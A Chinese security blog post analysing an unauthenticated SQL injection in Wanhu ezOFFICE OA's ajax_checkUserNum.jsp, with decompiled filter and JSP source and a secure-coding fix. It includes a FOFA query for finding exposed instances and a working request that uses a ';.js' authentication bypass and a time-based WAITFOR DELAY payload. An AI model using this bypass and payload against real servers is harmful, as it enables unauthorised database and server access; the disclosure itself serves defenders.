---
title: "万户OA ajax_checkUserNum.jsp SQL注入漏洞"
source: https://mrxn.net/jswz/defaultroot-ezOFFICE-ajax_checkUserNum-sqli.html
---

# 万户OA ajax\_checkUserNum.jsp SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/1/6 20:27
* 1878浏览
* [0评论](#comment)
* 1小时
  阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 0x01 产品简介

万户OA
[ezoffice](https://mrxn.net/tag/ezoffice "ezoffice")
是万户网络协同办公产品多年来一直将主要精力致力于中高端市场的一款OA协同办公软件产品，统一的基础管理平台，实现用户数据统一管理、权限统一分配、身份统一认证。统一规划门户网站群和协同办公平台，将外网信息维护、客户服务、互动交流和日常工作紧密结合起来，有效提高工作效率。

# 0x02 漏洞概述

万户 ezOFFICE ajax\_checkUserNum.jsp 接口存在
[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")
漏洞，未授权的攻击者可利用此
[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")
获取数据库权限，深入利用可获取服务器权限。

# 0x03 复现环境

本地环境 OR FOFA：app="ezOFFICE协同管理平台" || app="万户ezOFFICE协同管理平台" || app="万户网络-ezOFFICE"

# 漏洞复现

```
GET /defaultroot/modules/hrm/hr/employee/ajax_checkUserNum.jsp;.js?add=0&empId=1%1eWAITFOR%1eDELAY%1e'0:0:5' HTTP/1.1
Host: 192.168.22.187:7001
```

延时 5 秒
  
[![万户OA ajax_checkUserNum.jsp SQL注入漏洞](https://mrxn.net/content/uploadfile/202501/94531736167392.png)](https://mrxn.net/content/uploadfile/202501/94531736167392.png)

延时 3 秒
  
[![万户OA ajax_checkUserNum.jsp SQL注入漏洞](https://mrxn.net/content/uploadfile/202501/0c491736167396.png)](https://mrxn.net/content/uploadfile/202501/0c491736167396.png)

# 漏洞分析

## 万户 ezOFFICE 鉴权

其主要过滤逻辑在
`SetCharacterEncodingFilter`
类的
`doFilter`
来实现，代码如下：

```
public void doFilter(ServletRequest var1, ServletResponse var2, FilterChain var3) throws IOException, ServletException {
        HttpServletResponse var4 = (HttpServletResponse)var2;
        HttpServletRequest var5 = (HttpServletRequest)var1;
        PropertiesUtil.getInstance(var5);
        String var6 = PropertiesUtil.getInstance(var5).getRootPath();
        boolean var7 = false;
        SecurityList var8 = SecurityList.getInstance();
        String var9 = var5.getRequestURI();
        String var10 = var5.getContextPath();
        String var11 = var9.substring(var10.length());
        if (var11.indexOf("/iWebOfficeSign/OfficeServer.jsp") >= 0) {
            var3.doFilter(var1, var2);
        } else {
            if (this.ignore || var1.getCharacterEncoding() == null) {
                String var12 = this.selectEncoding(var1);
                if (var12 != null) {
                    var1.setCharacterEncoding(var12);
                }
            }

            if (var11.indexOf("/xfservices/GeneralWeb") < 0 && var11.indexOf("/services/ExchangeService") < 0) {
                UrlrewriteUtil var22 = new UrlrewriteUtil();
                String var13 = var5.getParameter("whir_new_verifyCode") == null ? "" : var5.getParameter("whir_new_verifyCode").toString();
                String var14 = var22.createNewUrl(var11, var5);
                if (var14 != null && !var14.equals("")) {
                    var4.sendRedirect(var6 + var14);
                    return;
                }

                String var15 = "";
                String var16 = "";
                if (var11.lastIndexOf(".") >= 0) {
                    var16 = var11.substring(var11.lastIndexOf("."));
                }

                if (var16 != null && var16.toLowerCase().equals(".jspx")) {
                    var4.sendRedirect(var6 + "/login.jsp");
                    return;
                }

                HttpSession var17 = var5.getSession();
                if ((var16.equals("") || var16.equals(".jsp") || var16.equals(".vm")) && this.needSecurity && var11.indexOf("/evo/weixin/") < 0 && var11.indexOf("/portal/") < 0 && var11.indexOf("/upgrade/") < 0 && var11.indexOf("/public/edit/") < 0 && !var8.getNosessionWhiteList().contains(var11)) {
                    if (var17.getAttribute("userId") == null || var17.getAttribute("userId").toString().equals("") || var17.getAttribute("userId").toString().equals("null")) {
                        if (var11.indexOf("/evo/sp/") >= 0) {
                            var4.sendRedirect(var6 + "/evo/sp/login.jsp");
                        } else {
                            var4.sendRedirect(var6 + "/public/messages/overtime.jsp");
                        }

                        logger.error("session 过滤 为空的请求：" + var11);
                        return;
                    }

                    String var18 = var17.getAttribute("userId").toString();
                    String var19 = var5.getParameter("common_whir_formUserId");
                    if (var19 != null && !var19.equals("") && !var19.equals(var18)) {
                        var4.sendRedirect(var6 + "/login.jsp");
                        return;
                    }
                }

                if (var11.endsWith("/Logon!logon.action") && this.needSecurity && !var11.equals("/Logon!logon.action")) {
                    var4.sendRedirect(var6 + "/public/messages/illegal.jsp");
                    return;
                }

                if (var5.getHeader("referer") != null) {
                    var15 = var5.getHeader("referer");
                } else {
                    var7 = true;
                }

                if (var7 && this.needSecurity && !var13.equals("1") && (var16.equals("") || var16.equals(".jsp") || var16.equals(".vm") || var16.equals(".acion")) && var11.indexOf("/evo/weixin/") < 0 && var11.indexOf("/portal/") < 0 && var11.indexOf("/upgrade/") < 0 && var11.indexOf("/public/edit/") < 0 && !var8.getPageWhiteList().contains(var11)) {
                    logger.debug("request_shorturi3:" + var11);
                    String var24 = var1.getRemoteAddr();
                    var8.addPageWhiteList_bar(var11, var24);
                    var5.getRequestDispatcher("/login.jsp").forward(var1, var2);
                    return;
                }

                if (var7) {
                    if (!var8.getPageWhiteList().contains(var11)) {
                    }
                } else {
                    boolean var23 = false;
                    List var25 = var8.getServiceWhiteList();
                    if (var25 != null && var25.size() > 0) {
                        for(int var20 = 0; var20 < var25.size(); ++var20) {
                            if (var15.startsWith("" + var25.get(var20))) {
                                var23 = true;
                            }
                        }
                    }

                    if (!var23) {
                    }
                }

                var3.doFilter(var1, var2);
            } else {
                if (!this.judgeIsSecurityIP((HttpServletRequest)var1)) {
                    return;
                }

                MAPIHttpServletRequestWrapper var21 = new MAPIHttpServletRequestWrapper((HttpServletRequest)var1);
                if (var21.haveXXE()) {
                    return;
                }

                var3.doFilter(var21, var2);
            }

        }
    }
```

其中两个关键点如下

* 通过
  `String var9 = var5.getRequestURI();`
  获取
  `url`
  存在缺陷，可以使用;.js来绕过下面获取文件后缀判断从而绕过 为jsp时的鉴权。
* 如果请求路径包含/iWebOfficeSign/OfficeServer.jsp，直接放行请求。（这也是网上很多POC里用到的方式之一）

## sql注入部分

文件源码如下，进行简单的
[~~代码审计~~](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1 "代码审计")

```
<%@ page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%
response.setHeader("Cache-Control","no-store");
response.setHeader("Pragma","no-cache");
response.setDateHeader ("Expires", 0);

String add = request.getParameter("add");//1--添加新用户，2--修改用户
String message = ",不能恢复删除的用户！";
if("1".equals(add)){
    message = ",不能添加新用户！";
}else if("2".equals(add)){
    message = ",不能修改该用户！";
}

com.whir.common.init.DogManager dm = com.whir.common.init.DogManager.getInstance();
String[] dogInfo = (String[]) dm.getDogkey(); 
String empId = request.getParameter("empId");
com.whir.ezoffice.customdb.common.util.DbOpt dbopt = null;
try{
    dbopt = new com.whir.ezoffice.customdb.common.util.DbOpt(); 

    String userAccounts = dbopt.executeQueryToStr("select USERACCOUNTS from org_employee where emp_id="+empId);
    if(userAccounts!=null&&!"".equals(userAccounts)&&!"null".equals(userAccounts)){
        String sql = "select count(emp_id) from org_employee where domain_id="+session.getAttribute("domainId")+" and USERISDELETED=0 and USERACCOUNTS is not null and USERACCOUNTS <> ' '";
        String num = dbopt.executeQueryToStr(sql);

        if(dogInfo!=null&&!"".equals(dogInfo[1])){
            if(Integer.parseInt(num)>=Integer.parseInt(dogInfo[1])){
                out.print("当前用户数"+num+",授权用户数"+dogInfo[1]+message);
            }
        }
    }

    dbopt.close();
}catch(Exception ee){
    ee.printStackTrace();
}finally{
    dbopt.close();
}
%>
```

朴实无华的sql拼接：通过
`request.getParameter`
获取
`empId`
值后直接拼接进sql语句，造成
[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")
漏洞，
`add`
参数可有可无。

# 最后

安全编码，针对获取
`url`
请使用
`getServletPath()`
来处理 ! 不要使用
`getRequestURL()`
或者
`getRequestURI()`
！

其他万户OA 相关漏洞
  
[万户 ezOFFICE selectAmountField.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-selectAmountField-sqli.html)
  
[万户OA系列漏洞](https://mrxn.net/tag/ezoffice)

# 参考

* `https://xz.aliyun.com/t/15390`
* `https://xz.aliyun.com/t/7544`
* `https://www.cnblogs.com/depycode/p/16124191.html`

* 标签：
* [#
  漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#
  web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#
  SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#
  代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#
  Java](https://mrxn.net/tag/Java)
* [#
  ezOFFICE](https://mrxn.net/tag/ezOFFICE)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录

×



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：
[Mrxn's Blog](https://mrxn.net/)
  
文章标题：
[万户OA ajax\_checkUserNum.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-ajax_checkUserNum-sqli.html)
  
文章链接：
<https://mrxn.net/jswz/defaultroot-ezOFFICE-ajax_checkUserNum-sqli.html>
  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

设备上扫码阅读



var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/defaultroot-ezOFFICE-ajax\_checkUserNum-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

手机扫码阅读



var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/defaultroot-ezOFFICE-ajax\_checkUserNum-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});